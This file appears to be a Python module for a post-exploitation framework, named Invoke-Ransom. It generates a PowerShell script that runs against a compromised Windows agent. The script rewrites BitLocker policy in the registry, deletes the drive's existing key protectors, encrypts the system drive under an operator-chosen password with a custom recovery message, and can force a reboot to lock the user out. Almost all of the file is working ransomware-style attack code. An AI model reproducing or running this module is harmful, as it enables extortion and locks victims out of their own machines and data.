from lib.common import helpers


class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-Ransom',

            'Author': ['@castiliad'],

            'Description': ('Uses Bitlocker to Encrypt System Drive on Windows 10 only.'),

            'Background': False,

            'OutputExtension': None,

            'NeedsAdmin': True,

            'OpsecSafe': False,

            'Language': 'powershell',

            'MinLanguageVersion': '2',

            'Comments': [
                'http://www.blackhillsinfosec.com/?p=5023'
            ]
        }

        self.options = {

            'Agent' : {
                'Description':   'Agent to encrypt.',
                'Required'   :   True,
                'Value'      :   ''
            },
            'Password': {
                'Description':   'Password for the encryption.',
                'Required'   :   True,
                'Value'      :   'password'
            },
	    'Message': {
                'Description':   'Bitlocker recovery message.',
                'Required'   :   False,
                'Value'      :   ''
            },
	    'Restart': {
                'Description':   'Restart computer to lock out user.',
                'Required'   :   False,
                'Value'      :   'False'
            }
        }

        self.mainMenu = mainMenu

        for param in params:
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):

        script = """
function Invoke-Ransom {
	[CmdletBinding()]
    Param (
	
        [Parameter(Mandatory = $True, Position = 0)]
        [ValidateNotNullOrEmpty()][String] $Password,
        
        [Parameter(Mandatory = $False, Position = 1)]
        [String] $Message,
		
        [Parameter(Mandatory = $False, Position = 2)]
        [String] $Restart
        )

$Check = (get-bitlockervolume -mountpoint $ENV:SystemDrive)
$Status = $Check.ProtectionStatus

REG ADD HKLM\SOFTWARE\Policies\Microsoft\FVE /v EnableBDEWithNoTPM /t REG_DWORD /d 1 /f /on
REG ADD HKLM\SOFTWARE\Policies\Microsoft\FVE /v UseAdvancedStartup /t REG_DWORD /d 1 /f /on
REG ADD HKLM\SOFTWARE\Policies\Microsoft\FVE /v UseTPM /t REG_DWORD /d 2 /f /on
REG ADD HKLM\SOFTWARE\Policies\Microsoft\FVE /v UseTPMKey /t REG_DWORD /d 2 /f /on
REG ADD HKLM\SOFTWARE\Policies\Microsoft\FVE /v UseTPMKeyPIN /t REG_DWORD /d 2 /f on


REG ADD HKLM\SOFTWARE\Policies\Microsoft\FVE /v RecoveryKeyMessage /t REG_SZ /d "'$Message'" /f /on
REG ADD HKLM\SOFTWARE\Policies\Microsoft\FVE /V RecoveryKeyMessageSource /t REG_DWORD /d 2 /f /on
REG ADD HKLM\SOFTWARE\Policies\Microsoft\FVE /v UseTPMPIN /t REG_DWORD /d 2 /f /on

$PlainPassword = $Password
$SecurePassword = $PlainPassword | ConvertTo-SecureString -AsPlainText -Force 

echo $Status

if($Status -eq 'Off'){

enable-bitlocker -EncryptionMethod Aes256 -password $securepassword -mountpoint $ENV:SystemDrive  -PasswordProtector -skiphardwaretest -UsedSpaceOnly
add-bitlockerkeyprotector -mountpoint $ENV:SystemDrive -RecoveryKeyProtector -RecoveryKeyPath $ENV:SystemDrive\ > $null
}

if ($Status -eq 'On'){
$IDS = $check.KeyProtector.KeyProtectorID
foreach($ID in $IDS){
Remove-BitlockerKeyProtector -Mountpoint $ENV:SystemDrive -KeyProtectorID $ID
}
add-bitlockerkeyprotector -mountpoint $ENV:SystemDrive -PasswordProtector -Password $securepassword
add-bitlockerkeyprotector -mountpoint $ENV:SystemDrive -RecoveryKeyProtector -RecoveryKeyPath $ENV:SystemDrive\ > $null
Resume-Bitlocker -MountPoint $ENV:SystemDrive\
}

if ($Restart -eq 'True'-Or $Restart -eq 'true'){
Restart-Computer -Force
echo 'Rebooting agent machine'
}

}
Invoke-Ransom"""

        for option, values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        script += " -" + str(option)
                    else:
                        script += " -" + str(option) + " " + str(values['Value'])

        return script